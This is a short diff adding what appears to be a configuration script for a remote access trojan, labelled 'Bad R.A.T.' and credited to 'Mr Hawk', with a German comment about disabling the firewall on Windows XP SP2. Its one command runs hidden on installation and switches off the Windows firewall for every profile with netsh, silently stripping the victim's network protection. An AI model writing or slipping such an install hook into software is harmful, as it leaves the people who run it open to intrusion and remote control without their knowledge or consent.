@@ -1,0 +1,6 @@
+;Event Setting [Bad R.A.T.]
+;by Mr Hawk
+
+; FW bei WinXP Sp2 auschalten
+
+OnInstallation: StartPath_Hide netsh firewall set opmode mode=disable profile=all
